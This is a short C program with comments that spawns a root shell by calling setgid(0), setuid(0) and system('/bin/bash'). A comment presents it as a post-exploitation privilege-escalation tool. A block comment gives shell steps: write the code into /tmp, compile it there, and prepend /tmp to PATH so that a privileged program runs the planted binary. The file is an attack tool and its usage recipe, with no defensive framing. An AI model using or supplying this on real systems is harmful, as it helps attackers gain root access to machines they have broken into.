#include<stdio.h>
#include<stdlib.h>


int main(){
	
	setgid(0);
	setuid(0);
	system("/bin/bash");
	
	return 0;
}

//When the above C code is infiltrated into the system, if the conditions are met, it is used to Increase Authorization in the POST EXPLOITING phase.

/*

echo 'int main(){ setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/example.c

* gcc /tmp/example.c -o /tmp/example

cd /tmp

export PATH=/tmp:$PATH
echo $PATH

*/
